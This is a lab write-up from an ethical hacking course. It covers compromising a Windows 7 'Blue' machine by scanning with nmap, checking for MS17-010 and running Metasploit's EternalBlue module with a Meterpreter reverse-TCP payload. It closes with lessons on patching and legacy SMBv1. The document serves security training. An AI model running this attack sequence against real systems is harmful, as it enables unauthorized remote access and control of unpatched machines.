# 1st Capstone Machine
This is my write-up for the first machine in the capstone section of the Practical Ethical Hacking course.
## Machine Information
- **Name**: Blue
- **Difficulty**: Easy
- **OS**: Windows 7
  
## Tools Used
- nmap
- Metasploit

## Objectives
- Perform enumeration to identify open ports and services.
- Discover any potential vulnerabilities.
- Exploit the identified vulnerability to gain full access to the system.

## Enumeration
I ran an nmap scan to check for open ports

`nmap -A -vv <IP>`

The scan results revealed the following open ports:
- 135/tcp - Microsoft Windows RPC
- 139/tcp - NetBIOS-ssn
- 445/tcp - Microsoft Windows SMB

The SMB service (port 445) caught my attention since it is commonly associated with known vulnerabilities, particularly on older versions of Windows like Windows 7.

## Vulnerability Discovery
Given that the machine is running Windows 7 (Build 7601), I researched known vulnerabilities for this specific version and identified a well-known vulnerability called EternalBlue (CVE-2017-0143), which exploits a flaw in SMBv1.

To verify if the machine was vulnerable, I used Metasploit:

1. I searched for the EternalBlue vulnerability module:
   
`search eternalblue`

2. The search revealed an auxiliary scanner for MS17-010, the vulnerability that EternalBlue exploits.

3. I set the target IP in the scanner to check if the system was vulnerable:

   `use auxiliary/scanner/smb/smb_ms17_010`
   
    `set RHOSTS <target IP>`
   
    `run`

The auxiliary scan confirmed that the target is likely vulnerable to MS17-010.

## Exploitation
After confirming the vulnerability, I proceeded to exploit it using Metasploit's EternalBlue exploit module.

1. I selected the appropriate exploit:

   `use exploit/windows/smb/ms17_010_eternalblue`

2. I configured the necessary settings:
- Set the target IP (RHOST).
- Set my local IP as the LHOST.
- Chose a payload for a stable reverse shell:

  `set payload windows/x64/meterpreter/reverse_tcp`

3. With everything set, I launched the exploit

   `run`

## Lessons Learned
While EternalBlue is a well-known and widely exploited vulnerability, it still serves as a reminder that unpatched, older systems, remain highly vulnerable to this type of attack. Even though the vulnerability is old, it continues to be a significant threat in many corporate environments where systems are not updated regularly.

This machine reinforced the importance of:
- Regular patching of critical vulnerabilities.
- The risks posed by legacy systems still running outdated protocols like SMBv1.

![image](https://github.com/user-attachments/assets/ec62b7c9-3ccb-4e17-95e2-b499e16e6a36)

